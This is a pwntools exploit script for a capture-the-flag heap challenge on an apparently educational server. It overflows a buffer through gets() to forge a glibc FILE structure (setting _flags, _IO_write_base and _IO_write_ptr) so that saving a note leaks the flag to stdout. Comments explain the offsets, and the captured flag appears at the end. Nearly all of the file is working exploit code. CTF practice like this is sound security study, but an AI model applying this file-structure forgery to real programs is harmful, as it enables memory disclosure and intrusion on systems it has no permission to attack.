from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 30215)

r.recvuntil(b'0x')

note_buf = int(r.recvline(), 16)
# program will assign one chunk for the file structure of fopen
# The program will also assign one chunk for The buffer used in the file
# Then the program will assign one chunk for the malloc for note_buf
# To calculate the flag address just subtract the note_buf address on chunk
# and the address of the buffer used by the file
# In this case, it's 0x1010
flag_addr = note_buf - 0x1010

# note_buf can be overflowed due to write_note() function using gets()
# Thus we can use create_note() to create a new note and get a new chunk
# and the value inside this chunk can be overflowed by buf_note
# And since this chunk will be used as file structure in save_note() function
# If we change the buffer pointer of this new chunk to point to the flag_addr
# and with other limitations, we can read the flag

# create_note()
r.sendlineafter(b'>', b'1')

# write_note() for overflow
r.sendlineafter(b'>', b'2')
# Calculate offset for overflow
# This can be calculated by first find address of _flags in file structure of the chunk created by create_note
# Then subtract it with note_buf
offset = 0x210
# Create fake file structure to make the pointer points to flag_addr
""" Conditions for arbitrary read
_flags &= ~_IO_NO_WRITES
_flags |= _IO_CURRENTLY_PUTTING
_IO_write_base != NULL
_IO_read_end = _IO_write_base
_IO_write_end < _IO_write_ptr
"""
_flags = _IO_CURRENTLY_PUTTING = 0x0800
payload = fake_file_struct = flat(
    _flags, 0,
    # _IO_read_end = _IO_write_base
    flag_addr, 0,
    # _IO_write_base = start address of flag, _IO_write_ptr = base + length
    flag_addr, flag_addr + 0x35,
    # _IO_write_end = 0 < IO_write_ptr
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    # _fileno is changed to 1 denotes stdout
    1
)
r.sendlineafter(b"data> ", b'A'*offset + payload)
r.sendlineafter(b'>', b'3')
print(r.recvlineS())
r.close()

#FLAG{600d_mu51c_53r135_p4r7_1_youtu.be/Z2Z9V-4DMGw}